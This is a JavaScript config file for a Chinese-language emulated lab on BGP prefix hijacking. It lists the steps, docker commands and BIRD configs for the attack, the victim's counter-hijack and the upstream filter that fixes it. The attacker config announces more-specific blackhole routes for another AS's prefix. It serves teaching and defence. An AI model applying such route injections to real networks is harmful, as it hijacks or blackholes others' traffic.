export const config = [
    {
        headerTitle: "启动靶场",
        text: [{
            shortText: null,
            cmdKwargs: [{
                action: 'compose',
                cmd: "composeUp",
                detach: false,
                composePath: './yesterday_once_more/01_bgp_prefix_hijacking/demo_output',
                pythonFile: 'BGP_Prefix_Hijacking.py'
            }]
        }],
    },
    {
        headerTitle: '环境设置',
        text: [
            {
                shortText: '环境设置',
                innerHtml: `
                <div>首先，我们需要启动仿真器。</div>
                <div>在本实验中，我们用 AS-199 来劫持 AS-153 的 IP 前缀（10.153.0.0/24）。为了帮助观察 BGP 劫持的效果，我们先从一台机器上发包给 AS-153 的机器。在 Internet Map 上我们应该可以看到数据包的流动（在 Filter 栏填入 icmp，加回车）：</div>
                <div>如果您使用自己的虚拟机连接到仿真器网络，可以从您的虚拟机访问机器 10.153.0.71。</div>
                <div class="code-block">
                    <div class="code-header">
                    <span class="code-title">命令</span>
                    </div>
                    <pre class="code-content">docker exec as151h-host_0-10.151.0.71 ping 10.153.0.71</pre>
                </div>
                `,
                cmdKwargs: [
                    {
                        action: 'exec',
                        containerNames: ['as151h-host_0-10.151.0.71'],
                        cmd: "ping 10.153.0.71",
                        detach: true
                    }
                ]
            }
        ],
    },
    {
        headerTitle: '劫持 AS-153',
        text: [
            {
                shortText: '劫持 AS-153',
                innerHtml: `
<div>步骤 1：攻击者是 AS-199，因此我们首先获取 AS-199 的 BGP 配置文件并进行修改。我们可以使用以下命令从仿真器中获取配置文件。(docker cp as199brd-attacker-bgp-10.199.0.254:/etc/bird/bird.conf ./as199_bird.conf_original)</div>
<div>步骤 2：我们将以下配置内容添加到 AS-199 的 BGP 配置文件的末尾。此配置劫持了 10.153.0.0/24 网络。</div>
<div class="code-block">
<div class="code-header">
    <span class="code-title">配置代码</span>
</div>
<pre class="code-content">##############################################
# 添加的 BGP 攻击
# 劫持 AS153 的网络前缀 10.153.0.0/24
##############################################

protocol static {
  ipv4 { table t_bgp;  };
  route 10.153.0.0/25 blackhole   {
      bgp_large_community.add(LOCAL_COMM);
  };
  route 10.153.0.128/25 blackhole {
      bgp_large_community.add(LOCAL_COMM);
  };
}</pre>
</div>
<div>步骤 3：完成上述修改后，将修改后的 BGP 配置文件复制回 AS-199，然后重新启动 AS-199 的 BGP 守护进程。我们已将修改后的配置文件放置在 as199brd_bird.conf_malicious 中。</div>
<div class="code-block">
<div class="code-header"><span class="code-title">命令</span></div>
<pre class="code-content">docker cp as199brd_bird.conf_malicious as199brd-attacker-bgp-10.199.0.254:/etc/bird/bird.conf
docker exec as199brd-attacker-bgp-10.199.0.254 birdc configure</pre>
</div>
                `,
                cmdKwargs: [
                    {
                        action: 'cp',
                        srcName: '',
                        dstName: 'as199brd-attacker-bgp-10.199.0.254',
                        srcPath: './yesterday_once_more/01_bgp_prefix_hijacking/files/as199brd_bird.conf_malicious',
                        dstPath: '/etc/bird/bird.conf',
                        detach: false
                    },
                    {
                        action: 'exec',
                        containerNames: ['as199brd-attacker-bgp-10.199.0.254'],
                        cmd: "birdc configure",
                        detach: false
                    },
                ]
            },
            {
                shortText: '路由信息',
                innerHtml: `<div>步骤 4：从 Internet Map 上，我们可以看到数据包流向已经改变，现在正流向 AS-199。现在当我们从任何机器 ping 10.153.0.71 时，会发现没有响应。让我们查看 as3brd-r103-10.103.0.3（这是一个 transit 自治系统）上的路由表，我们可以看到 AS-153 的网络有 3 条记录，其中 10.153.0.0/25 和 10.153.0.128/25 完全覆盖了 10.153.0.0/24。从记录中我们可以看到，前两个地址的下一跳路由 (10.3.0.254) 和 10.153.0.0/24 的下一跳路由 (10.3.3.253) 不同，这意味着发往 AS-153 的数据包已被重定向。</div>
                <div class="code-block">
                    <div class="code-header"><span class="code-title">命令</span></div>
                    <pre class="code-content">docker exec as3brd-r103-10.103.0.3 ip route</pre>
                </div>`,
                cmdKwargs: [
                    {
                        action: 'exec',
                        containerNames: ['as3brd-r103-10.103.0.3'],
                        cmd: "ip route",
                        detach: false
                    },
                ]
            },
        ],
    },
    {
        headerTitle: "AS-153 的反击",
        text: [
            {
                shortText: 'AS-153 的反击',
                innerHtml: `<div>步骤 1：AS-153 可以使用相同的方法将其网络劫持回来。只需要在其 BGP 配置文件中添加以下内容，然后重新启动 BGP 守护进程。</div>
<div class="code-block">
<div class="code-header">
<span class="code-title">配置代码</span>
</div>
<pre class="code-content">#########################################
# 为 BGP 攻击添加
# 反击
#########################################

protocol static {
  ipv4 { table t_bgp; };
  route 10.153.0.0/26 via "net0" {
           bgp_large_community.add(LOCAL_COMM);
  };
  route 10.153.0.64/26 via "net0" {
           bgp_large_community.add(LOCAL_COMM);
  };
  route 10.153.0.128/26 via "net0" {
           bgp_large_community.add(LOCAL_COMM);
  };
  route 10.153.0.192/26 via "net0" {
           bgp_large_community.add(LOCAL_COMM);
  };
}</pre>
</div>
<div>步骤 2：我们已将修改后的配置放在 as153brd_bird.conf_fightback 中。我们只需要将其复制回 AS-153 的容器中。运行以下命令后，从 Internet Map 上我们可以看到数据包流向已改变，现在流回了 AS-153。</div>
<div class="code-block">
    <div class="code-header"><span class="code-title">命令</span></div>
    <pre class="code-content">docker cp as153brd_bird.conf_fightback as153brd-router0-10.153.0.254:/etc/bird/bird.conf
docker exec as153brd-router0-10.153.0.254 birdc configure</pre>
</div>
`,
                cmdKwargs: [
                    {
                        action: 'cp',
                        srcName: '',
                        dstName: 'as153brd-router0-10.153.0.254',
                        srcPath: './yesterday_once_more/01_bgp_prefix_hijacking/files/as153brd_bird.conf_fightback',
                        dstPath: '/etc/bird/bird.conf',
                        detach: false
                    },
                    {
                        action: 'exec',
                        containerNames: ['as153brd-router0-10.153.0.254'],
                        cmd: "birdc configure",
                        detach: false
                    },
                ]
            },
        ],
    },
    {
        headerTitle: '让 AS-199 的上游解决问题',
        text: [
            {
                shortText: '恢复 AS-153 的配置',
                innerHtml: `<div>步骤 1：在执行此任务之前，我们首先恢复 AS-153 的配置，这样攻击仍然有效，我们可以请 AS-199 的上游服务商来解决这个问题。</div>
                <div class="code-block">
                    <div class="code-header"><span class="code-title">命令</span></div>
                    <pre class="code-content">docker cp as153brd_bird.conf_original as153brd-router0-10.153.0.254:/etc/bird/bird.conf
docker exec as153brd-router0-10.153.0.254 birdc configure</pre>
                </div>`,
                cmdKwargs: [
                    {
                        action: 'cp',
                        srcName: '',
                        dstName: 'as153brd-router0-10.153.0.254',
                        srcPath: './yesterday_once_more/01_bgp_prefix_hijacking/files/as153brd_bird.conf_original',
                        dstPath: '/etc/bird/bird.conf',
                        detach: false
                    },
                    {
                        action: 'exec',
                        containerNames: ['as153brd-router0-10.153.0.254'],
                        cmd: "birdc configure",
                        detach: false
                    },
                ]
            },
            {
                shortText: '查找 AS-199 的上游',
                innerHtml: `<div>步骤 2：让我们找出 AS-199 的上游服务商是谁。以下命令从 BGP 守护进程 bird 查询 AS-199 的 BGP 路由器信息。</div>
                <div class="code-block">
                    <div class="code-header"><span class="code-title">命令</span></div>
                    <pre class="code-content">docker exec as199brd-attacker-bgp-10.199.0.254 birdc show protocols</pre>
                </div>`,
                cmdKwargs: [
                    {
                        action: 'exec',
                        containerNames: ['as199brd-attacker-bgp-10.199.0.254'],
                        cmd: "birdc show protocols",
                        detach: false
                    },
                ]
            },
            {
                shortText: 'BGP 会话 (AS-11)',
                innerHtml: `<div>从结果中，我们只能看到一个 BGP session，即 u_as11；这是 AS-11。该自治系统在多个位置都有 BGP 路由器。从 Internet Map 上，我们可以看到 AS-199 和 AS-11 是在 IX-105 进行的对等连接（peering）。我们可以找到对应的容器名称 (as11brd-r105-10.105.0.11)</div>
                <div class="code-block">
                    <div class="code-header"><span class="code-title">命令</span></div>
                    <pre class="code-content">docker ps | grep as11</pre>
                </div>`,
                cmdKwargs: [
                    {
                        action: 'exec',
                        cmd: "ps|grep as11",
                        detach: false
                    },
                ]
            },
            {
                shortText: '修改 as11brd-r105-10.105.0.11 的 BGP 配置',
                innerHtml: `
<div>步骤 3：我们可以获取 as11brd-r105-10.105.0.11 的 BGP 配置文件，加入一行到它和 AS-199 的配置里（见下面的带注释的行）。这行判断 AS-199 对外 announce 的网络前缀是否是 10.199.0.0/24，如果不是的话就拒绝接受这个 BGP announcement。</div>
<div class="code-block">
<div class="code-header"><span class="code-title">配置代码</span></div>
<pre class="code-content">protocol bgp c_as199 {
    ipv4 {
        table t_bgp;
        import filter {
            bgp_large_community.add(CUSTOMER_COMM);
            bgp_local_pref = 30;
            if (net != 10.199.0.0/24) then reject;  # 添加此行以解决问题
            accept;
        };
        export all;
        next hop self;
    };
    local 10.105.0.11 as 11;
    neighbor 10.105.0.199 as 199;
}</pre>
</div>
<div>步骤 4：把修改过的 BGP 配置文件传回 as2brd-r105-10.105.0.2。我们修改过的文件是 as2brd-r105_bird.conf_fixproblem。运行完下面的命令，从 Internet Map 上我们可以看到数据包的流向改变了，重新流向了 AS-153。</div>
<div class="code-block">
<div class="code-header"><span class="code-title">命令</span></div>
<pre class="code-content">docker cp as11brd-r105_bird.conf_fixproblem as11brd-r105-10.105.0.11:/etc/bird/bird.conf
docker exec as11brd-r105-10.105.0.11 birdc configure</pre>
</div>`,
                cmdKwargs: [
                    {
                        action: 'cp',
                        srcName: '',
                        dstName: 'as11brd-r105-10.105.0.11',
                        srcPath: './yesterday_once_more/01_bgp_prefix_hijacking/files/as11brd-r105_bird.conf_fixproblem',
                        dstPath: '/etc/bird/bird.conf',
                        detach: false
                    },
                    {
                        action: 'exec',
                        containerNames: ['as11brd-r105-10.105.0.11'],
                        cmd: "birdc configure",
                        detach: false
                    },
                ]
            },
        ],
    },
    {
        headerTitle: "还原靶场",
        text: [
            {
                shortText: null,
                cmdKwargs: [
                    {
                        action: 'cp',
                        srcName: '',
                        dstName: 'as199brd-attacker-bgp-10.199.0.254',
                        srcPath: './yesterday_once_more/01_bgp_prefix_hijacking/files/as199brd_bird.conf_original',
                        dstPath: '/etc/bird/bird.conf',
                        detach: false
                    },
                    {
                        action: 'exec',
                        containerNames: ['as199brd-attacker-bgp-10.199.0.254'],
                        cmd: "birdc configure",
                        detach: false
                    },
                    {
                        action: 'cp',
                        srcName: '',
                        dstName: 'as153brd-router0-10.153.0.254',
                        srcPath: './yesterday_once_more/01_bgp_prefix_hijacking/files/as153brd_bird.conf_original',
                        dstPath: '/etc/bird/bird.conf',
                        detach: false
                    },
                    {
                        action: 'exec',
                        containerNames: ['as153brd-router0-10.153.0.254'],
                        cmd: "birdc configure",
                        detach: false
                    },
                    {
                        action: 'cp',
                        srcName: '',
                        dstName: 'as11brd-r105-10.105.0.11',
                        srcPath: './yesterday_once_more/01_bgp_prefix_hijacking/files/as11brd-r105_bird.conf_original',
                        dstPath: '/etc/bird/bird.conf',
                        detach: false
                    },
                    {
                        action: 'exec',
                        containerNames: ['as11brd-r105-10.105.0.11'],
                        cmd: "birdc configure",
                        detach: false
                    },
                ]
            }
        ],
    },
    {
        headerTitle: "关闭靶场",
        text: [{
            shortText: null,
            cmdKwargs: [{
                action: 'compose',
                cmd: "composeDown",
                detach: false,
                composePath: './yesterday_once_more/01_bgp_prefix_hijacking/demo_output'
            }]
        }],
    },
]

export const attackEffectConfig = {
    type: "iframe",
    targetIPs: ["10.153.0.0/24"],
    targetHost: "https://example.com/",
}

export default config